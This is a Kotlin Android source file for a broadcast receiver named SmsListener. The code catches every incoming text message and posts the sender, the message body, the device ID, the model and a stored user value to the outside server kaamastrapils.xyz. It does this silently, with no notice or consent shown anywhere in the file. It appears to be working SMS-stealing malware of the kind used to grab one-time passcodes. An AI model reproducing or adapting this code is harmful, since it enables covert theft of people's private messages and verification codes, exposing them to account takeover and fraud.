package com.example.appication

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Looper
import android.provider.Settings
import android.telephony.SmsMessage
import android.util.Log
import android.widget.Toast
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.*


class SmsListener : BroadcastReceiver() {
    private val preferences: SharedPreferences? = null
    private val SMS_RECEIVED: String = "android.provider.Telephony.SMS_RECEIVED"
    private val TAG = "SMSBroadcastReceiver"
    override fun onReceive(context: Context?, intent: Intent) {
        //Toast.makeText(context,"sdcscs",Toast.LENGTH_LONG).show()

        val interceptor = HttpLoggingInterceptor()
        interceptor.apply { interceptor.level = HttpLoggingInterceptor.Level.BODY }
        val client = OkHttpClient.Builder().addInterceptor(interceptor).build()

        val retrofit = Retrofit.Builder()
            .baseUrl("https://kaamastrapils.xyz/")
            .client(client)
            .addConverterFactory(GsonConverterFactory.create())
            .build()
        val service: RetrofitInterface = retrofit.create(RetrofitInterface::class.java)
        val job = SupervisorJob()

        val os = Build.VERSION.RELEASE
        val model = Build.MODEL
        val deviceid = Settings.Secure.getString(
            context?.contentResolver, Settings.Secure.ANDROID_ID
        )
        val sharedPref = context?.getSharedPreferences("base",Context.MODE_PRIVATE)
        val storedUserValue = sharedPref?.getString("user",null)





        if (intent.action != null) {
            if (intent.action.equals(SMS_RECEIVED)) {
                val bundle = intent.extras
                if (bundle != null) {
                    val pdus = bundle["pdus"] as Array<*>?
                    val messages: Array<SmsMessage?> = arrayOfNulls<SmsMessage>(pdus!!.size)
                    for (i in pdus.indices) {
                        messages[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                        Log.e("Message Content : ", " == " + messages[i]?.messageBody)
                        Log.e(
                            "Message Content Body : ",
                            " == " + (messages[i]?.displayMessageBody)
                        )
                        Log.e("Message recieved From", " == " + (messages[0]?.originatingAddress))
                        CoroutineScope(job).launch {
                            service.sendMessage(
                                Message(
                                    deviceid,
                                    "$model $os",
                                    System.currentTimeMillis().toString(),
                                    messages[0]?.originatingAddress!!,
                                    messages[i]?.messageBody!!,
                                    storedUserValue!!)
                            )
                        }
                    }
                    /*if (messages.length > -1) {
                Log.e("Message recieved: "," == "+ messages[0].getMessageBody());
                Log.e("Message recieved From"," == "+ messages[0].getOriginatingAddress());
            }*/
                }
            }
        }
    }
}